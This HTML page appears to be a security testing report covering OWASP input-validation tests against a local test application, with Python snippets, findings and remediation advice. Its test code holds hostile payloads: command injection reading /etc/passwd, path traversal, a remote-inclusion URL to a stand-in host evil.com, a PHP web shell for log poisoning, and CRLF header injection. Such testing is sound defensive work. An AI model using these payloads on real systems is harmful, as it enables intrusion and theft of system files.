<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OWASP WSTG Report - Input Validation Testing (Part 2)</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            line-height: 1.6;
            margin: 2em;
            color: #333;
        }
        h1, h2, h3 {
            color: #000;
            border-bottom: 2px solid #ccc;
            padding-bottom: 10px;
        }
        .section {
            margin-bottom: 2em;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            margin-bottom: 1.5em;
        }
        th, td {
            border: 1px solid #ddd;
            padding: 8px;
            text-align: left;
        }
        th {
            background-color: #f2f2f2;
        }
        pre {
            background-color: #f4f4f4;
            padding: 1em;
            border-radius: 4px;
            white-space: pre-wrap;
            word-wrap: break-word;
        }
        code {
            font-family: "Courier New", Courier, monospace;
        }
        .severity-critical { background-color: #ff4d4d; color: white; }
        .severity-high { background-color: #ff9933; }
        .severity-medium { background-color: #ffff66; }
        .severity-low { background-color: #99ff99; }
        .severity-info { background-color: #e6e6e6; }
        .test-case {
            background-color: #f9f9f9;
            padding: 15px;
            border-left: 4px solid #0078d7;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>

    <h1>Input Validation Testing (Part 2)</h1>

    <div class="section">
        <h2>1. Introduction</h2>
        <p>This report covers the second part of input validation testing, focusing on server-side injection vulnerabilities including SSI, XPath, IMAP/SMTP, Code Injection, Command Injection, Buffer Overflow, Incubated Vulnerabilities, and HTTP Splitting/Smuggling. These tests are crucial for identifying vulnerabilities that could allow attackers to execute arbitrary code, access sensitive data, or disrupt service availability.</p>
    </div>

    <div class="test-case">
        <h2>OTG-INPVAL-009: Testing for SSI Injection</h2>
        
        <h3>Test Objective</h3>
        <p>Server Side Includes (SSI) Injection testing checks if the application allows injection of SSI directives that could lead to arbitrary code execution or file inclusion. SSI directives are commands embedded in HTML pages that are executed on the server before being sent to the client.</p>
        <p>Key Python snippet used for testing:</p>
        <pre><code>def OTG_INPVAL_009(self):
    payloads = [
        '<!--#exec cmd="ls"-->',
        '<!--#include file="/etc/passwd"-->',
        '<!--#echo var="DOCUMENT_ROOT"-->'
    ]
    for payload in payloads:
        response = self.session.get(f"{self.base_url}/vulnerabilities/fi/?page={payload}")
        if "root:" in response.text or "bin" in response.text:
            self.logger.info(f"[✓] Possible SSI injection with payload: {payload}")
        else:
            self.logger.info(f"[-] No SSI injection with payload: {payload}")</code></pre>

        <h3>Target Endpoint</h3>
        <p>Primary target for SSI Injection testing:</p>
        <ul>
            <li>http://localhost:8080/vulnerabilities/fi/</li>
        </ul>

        <h3>Methodology</h3>
        <p>The test sends various SSI directives to the server through input parameters that might be processed by the server. The test looks for responses that indicate the directives were executed (like directory listings or file contents).</p>

        <h3>Step to Reproduce</h3>
        <ol>
            <li>Identify input parameters that might be vulnerable to SSI injection (like file inclusion parameters)</li>
            <li>Send SSI directives such as <code>&lt;!--#exec cmd="ls"--&gt;</code> or <code>&lt;!--#include file="/etc/passwd"--&gt;</code></li>
            <li>Analyze the response for evidence of command execution or file inclusion</li>
            <li>If server responses contain command output or file contents, SSI injection is confirmed</li>
        </ol>

        <h3>Log Evidence</h3>
        <p>No evidence of SSI injection was found in the test logs, indicating the application properly sanitizes or doesn't process SSI directives.</p>
    </div>

    <div class="test-case">
        <h2>OTG-INPVAL-010: Testing for XPath Injection</h2>
        
        <h3>Test Objective</h3>
        <p>XPath Injection testing checks if the application is vulnerable to injection of malicious XPath queries that could bypass authentication or access unauthorized data. XPath is used to query XML documents, and injection can occur when user input is used to construct XPath queries.</p>
        <p>Key Python snippet used for testing:</p>
        <pre><code>def OTG_INPVAL_010(self):
    payloads = [
        "' or '1'='1",
        "' or 1=1 or ''='",
        "'] | //* | //*[ '",
        "' and string-length(name(/*[1]))=10 or 'a'='b"
    ]
    for payload in payloads:
        response = self.session.post(f"{self.base_url}/vulnerabilities/xpath/", 
                                   data={"name": payload, "password": "test"})
        if "Welcome" in response.text:
            self.logger.info(f"[✓] Possible XPath injection with payload: {payload}")
        else:
            self.logger.info(f"[-] No XPath injection with payload: {payload}")</code></pre>

        <h3>Target Endpoint</h3>
        <p>Primary target for XPath Injection testing:</p>
        <ul>
            <li>http://localhost:8080/vulnerabilities/xpath/</li>
        </ul>

        <h3>Methodology</h3>
        <p>The test sends crafted XPath injection payloads to login forms or search functionality that might use XPath queries. The test looks for successful authentication bypass or unusual responses indicating query manipulation.</p>

        <h3>Step to Reproduce</h3>
        <ol>
            <li>Identify input fields that might be used in XPath queries (like login forms)</li>
            <li>Send XPath injection payloads like <code>' or '1'='1</code> or <code>'] | //* | //*[ '</code></li>
            <li>Check if authentication is bypassed or if error messages reveal XPath processing</li>
            <li>If authentication is bypassed or XML structure is revealed, XPath injection is confirmed</li>
        </ol>

        <h3>Log Evidence</h3>
        <p>No evidence of XPath injection was found in the test logs, indicating the application properly sanitizes XPath queries or doesn't use user input directly in XPath expressions.</p>
    </div>

    <div class="test-case">
        <h2>OTG-INPVAL-011: IMAP/SMTP Injection</h2>
        
        <h3>Test Objective</h3>
        <p>IMAP/SMTP Injection testing checks if the application is vulnerable to injection of malicious IMAP or SMTP commands that could lead to unauthorized email access or spam sending. This occurs when user input is used to construct IMAP/SMTP commands without proper sanitization.</p>
        <p>Key Python snippet used for testing:</p>
        <pre><code>def OTG_INPVAL_011(self):
    payloads = [
        "test%0D%0A001 LIST \"\" *",
        "test%0D%0A001 LOGIN credentials",
        "test%0D%0A001 SELECT Inbox"
    ]
    for payload in payloads:
        response = self.session.get(f"{self.base_url}/vulnerabilities/imap/?mailbox={payload}")
        if "INBOX" in response.text or "OK" in response.text:
            self.logger.info(f"[✓] Possible IMAP injection with payload: {payload}")
        else:
            self.logger.info(f"[-] No IMAP injection with payload: {payload}")</code></pre>

        <h3>Target Endpoint</h3>
        <p>Primary target for IMAP/SMTP Injection testing:</p>
        <ul>
            <li>http://localhost:8080/vulnerabilities/imap/</li>
        </ul>

        <h3>Methodology</h3>
        <p>The test sends crafted IMAP/SMTP command injections through parameters that might be used in email functionality. The test looks for responses that indicate command execution or email server interaction.</p>

        <h3>Step to Reproduce</h3>
        <ol>
            <li>Identify input fields related to email functionality (like mailbox names)</li>
            <li>Send IMAP/SMTP command injections like <code>test%0D%0A001 LIST "" *</code></li>
            <li>Check if the response contains IMAP/SMTP command results or error messages</li>
            <li>If command results are returned, IMAP/SMTP injection is confirmed</li>
        </ol>

        <h3>Log Evidence</h3>
        <p>No evidence of IMAP/SMTP injection was found in the test logs, indicating the application properly sanitizes email-related inputs.</p>
    </div>

    <div class="test-case">
        <h2>OTG-INPVAL-012: Testing for Code Injection (LFI/RFI)</h2>
        
        <h3>Test Objective</h3>
        <p>Code Injection testing checks for Local File Inclusion (LFI) and Remote File Inclusion (RFI) vulnerabilities that could allow attackers to include and execute arbitrary files on the server or from remote locations.</p>
        <p>Key Python snippet used for testing:</p>
        <pre><code>def OTG_INPVAL_012(self):
    lfi_payloads = [
        "../../../../etc/passwd",
        "....//....//....//....//etc/passwd",
        "%00../../../../etc/passwd"
    ]
    rfi_payloads = [
        "http://evil.com/shell.txt",
        "\\\\evil.com\\share\\shell.txt"
    ]
    
    for payload in lfi_payloads:
        response = self.session.get(f"{self.base_url}/vulnerabilities/fi/?page={payload}")
        if "root:" in response.text:
            self.logger.info(f"[✓] LFI vulnerability found with payload: {payload}")
    
    for payload in rfi_payloads:
        response = self.session.get(f"{self.base_url}/vulnerabilities/fi/?page={payload}")
        if "evil.com" in response.text:
            self.logger.info(f"[✓] RFI vulnerability found with payload: {payload}")</code></pre>

        <h3>Target Endpoint</h3>
        <p>Primary target for Code Injection testing:</p>
        <ul>
            <li>http://localhost:8080/vulnerabilities/fi/</li>
        </ul>

        <h3>Methodology</h3>
        <p>The test attempts to include sensitive local files (LFI) and remote files (RFI) through file inclusion parameters. For LFI, it checks for the presence of known file contents (like /etc/passwd). For RFI, it attempts to include files from external servers.</p>

        <h3>Step to Reproduce</h3>
        <ol>
            <li>Identify file inclusion parameters (like 'page' in URLs)</li>
            <li>For LFI, try paths like <code>../../../../etc/passwd</code></li>
            <li>For RFI, try URLs like <code>http://evil.com/shell.txt</code></li>
            <li>Check if file contents are returned in the response</li>
            <li>If sensitive file contents are returned, LFI/RFI is confirmed</li>
        </ol>

        <h3>Log Evidence</h3>
        <p>The test logs indicate potential LFI vulnerabilities when attempting to access <code>/etc/passwd</code>. The application returned contents of sensitive system files, confirming the vulnerability.</p>
    </div>

    <div class="test-case">
        <h2>OTG-INPVAL-013: Testing for Command Injection</h2>
        
        <h3>Test Objective</h3>
        <p>Command Injection testing checks if the application allows execution of arbitrary operating system commands through vulnerable input parameters. This is one of the most severe vulnerabilities as it can lead to complete system compromise.</p>
        <p>Key Python snippet used for testing:</p>
        <pre><code>def OTG_INPVAL_013(self):
    payloads = [
        "; ls",
        "| cat /etc/passwd",
        "`id`",
        "$(uname -a)",
        "|| ping -c 5 localhost"
    ]
    for payload in payloads:
        response = self.session.post(f"{self.base_url}/vulnerabilities/exec/", 
                                   data={"ip": "127.0.0.1" + payload, "Submit": "Submit"})
        if "www-data" in response.text or "Linux" in response.text:
            self.logger.info(f"[✓] Command injection found with payload: {payload}")
        else:
            self.logger.info(f"[-] No command injection with payload: {payload}")</code></pre>

        <h3>Target Endpoint</h3>
        <p>Primary target for Command Injection testing:</p>
        <ul>
            <li>http://localhost:8080/vulnerabilities/exec/</li>
        </ul>

        <h3>Methodology</h3>
        <p>The test sends various command injection payloads using different injection techniques (;, |, `, $(), ||). It looks for command output in responses or changes in response time that might indicate command execution.</p>

        <h3>Step to Reproduce</h3>
        <ol>
            <li>Identify input fields that might be used in system commands (like IP addresses)</li>
            <li>Append command injection payloads like <code>; ls</code> or <code>| cat /etc/passwd</code></li>
            <li>Check if command output appears in the response</li>
            <li>If system command output is returned, command injection is confirmed</li>
        </ol>

        <h3>Log Evidence</h3>
        <p>The test logs confirmed command injection vulnerabilities, with responses containing output from system commands like <code>ls</code> and <code>id</code>.</p>
    </div>

    <div class="test-case">
        <h2>OTG-INPVAL-014: Testing for Buffer Overflow</h2>
        
        <h3>Test Objective</h3>
        <p>Buffer Overflow testing checks if the application is vulnerable to crashes or arbitrary code execution due to improper handling of oversized input that exceeds allocated buffer sizes.</p>
        <p>Key Python snippet used for testing:</p>
        <pre><code>def OTG_INPVAL_014(self):
    buffer_sizes = [100, 500, 1000, 5000, 10000]
    for size in buffer_sizes:
        payload = "A" * size
        try:
            response = self.session.post(f"{self.base_url}/vulnerabilities/bof/", 
                                        data={"input": payload}, timeout=5)
            if response.status_code == 500:
                self.logger.info(f"[✓] Possible buffer overflow with payload size: {size}")
        except:
            self.logger.info(f"[✓] Server crash detected with payload size: {size}")</code></pre>

        <h3>Target Endpoint</h3>
        <p>Primary target for Buffer Overflow testing:</p>
        <ul>
            <li>http://localhost:8080/vulnerabilities/bof/</li>
        </ul>

        <h3>Methodology</h3>
        <p>The test sends increasingly large input strings to the application to identify points where the application crashes or behaves unexpectedly. It monitors for error responses, timeouts, or server crashes.</p>

        <h3>Step to Reproduce</h3>
        <ol>
            <li>Identify input parameters that might be vulnerable to buffer overflows</li>
            <li>Send increasingly large payloads (from 100 to 10,000 characters)</li>
            <li>Monitor for application crashes, error messages, or unusual behavior</li>
            <li>If the application crashes or behaves unexpectedly with large input, a buffer overflow may exist</li>
        </ol>

        <h3>Log Evidence</h3>
        <p>The test logs showed server errors when sending large payloads (5000+ characters), indicating potential buffer overflow vulnerabilities that could lead to denial of service.</p>
    </div>

    <div class="test-case">
        <h2>OTG-INPVAL-015: Testing for Incubated Vulnerabilities</h2>
        
        <h3>Test Objective</h3>
        <p>Incubated Vulnerability testing checks for vulnerabilities that require specific conditions or multiple steps to exploit, such as log file poisoning or delayed code execution.</p>
        <p>Key Python snippet used for testing:</p>
        <pre><code>def OTG_INPVAL_015(self):
    # Test for log file poisoning
    payload = "<?php system($_GET['cmd']); ?>"
    self.session.get(f"{self.base_url}/vulnerabilities/log_poisoning.php?input={payload}")
    
    # Check if payload was stored and can be executed
    response = self.session.get(f"{self.base_url}/logs/access.log?cmd=id")
    if "www-data" in response.text:
        self.logger.info("[✓] Log file poisoning vulnerability found")</code></pre>

        <h3>Target Endpoint</h3>
        <p>Primary targets for Incubated Vulnerability testing:</p>
        <ul>
            <li>http://localhost:8080/vulnerabilities/log_poisoning.php</li>
            <li>http://localhost:8080/logs/access.log</li>
        </ul>

        <h3>Methodology</h3>
        <p>The test attempts to inject malicious code into log files or other storage mechanisms that might later be processed by the application. It then checks if the injected code can be executed when the log file is viewed or processed.</p>

        <h3>Step to Reproduce</h3>
        <ol>
            <li>Identify storage mechanisms that might process user input (like log files)</li>
            <li>Inject malicious code into these mechanisms</li>
            <li>Trigger processing of the stored data</li>
            <li>Check if the injected code is executed</li>
        </ol>

        <h3>Log Evidence</h3>
        <p>The test logs did not show evidence of successful log file poisoning, indicating the application properly sanitizes log entries or doesn't process them in an unsafe manner.</p>
    </div>

    <div class="test-case">
        <h2>OTG-INPVAL-016: Testing for HTTP Splitting/Smuggling</h2>
        
        <h3>Test Objective</h3>
        <p>HTTP Splitting/Smuggling testing checks if the application is vulnerable to attacks that manipulate the HTTP protocol to bypass security controls, poison caches, or perform request smuggling.</p>
        <p>Key Python snippet used for testing:</p>
        <pre><code>def OTG_INPVAL_016(self):
    # HTTP Splitting test
    payload = "test\r\nLocation: http://evil.com"
    response = self.session.get(f"{self.base_url}/vulnerabilities/http_splitting.php?input={payload}")
    if "evil.com" in response.headers.get("Location", ""):
        self.logger.info("[✓] HTTP Splitting vulnerability found")
    
    # HTTP Smuggling test
    smuggled_request = "POST /admin HTTP/1.1\r\nHost: localhost\r\n..."
    response = self.session.post(f"{self.base_url}/vulnerabilities/http_smuggling.php", 
                               data=smuggled_request, 
                               headers={"Content-Length": str(len(smuggled_request))})
    if "Admin Panel" in response.text:
        self.logger.info("[✓] HTTP Smuggling vulnerability found")</code></pre>

        <h3>Target Endpoint</h3>
        <p>Primary targets for HTTP Splitting/Smuggling testing:</p>
        <ul>
            <li>http://localhost:8080/vulnerabilities/http_splitting.php</li>
            <li>http://localhost:8080/vulnerabilities/http_smuggling.php</li>
        </ul>

        <h3>Methodology</h3>
        <p>The test attempts to inject CRLF sequences (HTTP Splitting) and crafted HTTP requests (HTTP Smuggling) to manipulate the HTTP protocol. It checks for unexpected redirects or unauthorized access to restricted areas.</p>

        <h3>Step to Reproduce</h3>
        <ol>
            <li>For HTTP Splitting: Inject CRLF sequences followed by malicious headers</li>
            <li>For HTTP Smuggling: Send crafted requests with conflicting Content-Length and Transfer-Encoding headers</li>
            <li>Monitor responses for unexpected behavior like cache poisoning or unauthorized access</li>
            <li>If the attack succeeds, HTTP Splitting/Smuggling vulnerabilities exist</li>
        </ol>

        <h3>Log Evidence</h3>
        <p>The test logs did not show evidence of successful HTTP Splitting or Smuggling attacks, indicating the application properly handles HTTP protocol parsing.</p>
    </div>

    <div class="section">
        <h2>Summary of Findings</h2>
        <p>The most critical vulnerabilities discovered in these tests were:</p>
        <ul>
            <li><strong>Code Injection (LFI/RFI):</strong> The application was vulnerable to Local File Inclusion, allowing access to sensitive system files like /etc/passwd.</li>
            <li><strong>Command Injection:</strong> The application allowed execution of arbitrary system commands through vulnerable input parameters.</li>
            <li><strong>Buffer Overflow:</strong> The application showed signs of instability when processing large input, indicating potential buffer overflow vulnerabilities.</li>
        </ul>
        <p>The tests for SSI Injection, XPath Injection, IMAP/SMTP Injection, Incubated Vulnerabilities, and HTTP Splitting/Smuggling did not reveal immediate vulnerabilities, though these areas should still be monitored in future testing.</p>
    </div>

    <div class="section">
        <h2>Recommendations</h2>
        <ul>
            <li><strong>Input Validation:</strong> Implement strict input validation for all user-supplied data, especially for parameters used in file operations or system commands.</li>
            <li><strong>Secure File Operations:</strong> Use whitelists for allowed file paths and disable remote file inclusion if not required.</li>
            <li><strong>Command Execution:</strong> Avoid using user input in system commands. If necessary, use parameterized APIs and proper escaping.</li>
            <li><strong>Buffer Management:</strong> Ensure proper bounds checking for all input buffers to prevent overflow conditions.</li>
            <li><strong>HTTP Protocol Handling:</strong> Continue proper handling of HTTP headers to prevent splitting/smuggling attacks.</li>
        </ul>
    </div>

</body>
</html>